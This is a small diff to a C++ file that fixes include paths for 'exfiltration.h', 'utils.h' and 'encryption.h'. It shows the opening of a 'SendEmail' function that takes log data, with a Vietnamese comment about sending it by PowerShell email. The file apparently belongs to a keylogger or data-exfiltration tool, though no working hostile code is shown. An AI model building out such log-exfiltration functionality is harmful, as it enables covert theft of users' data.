@@ -1,6 +1,6 @@
-﻿#include "../exfiltration.h"
-#include "../utils.h"
-#include "../encryption.h"
+﻿#include "exfiltration.h"
+#include "utils.h"
+#include "encryption.h"
 
 bool SendEmail(const std::string& logData) {
     // Sử dụng PowerShell để gửi email với SSL/TLS
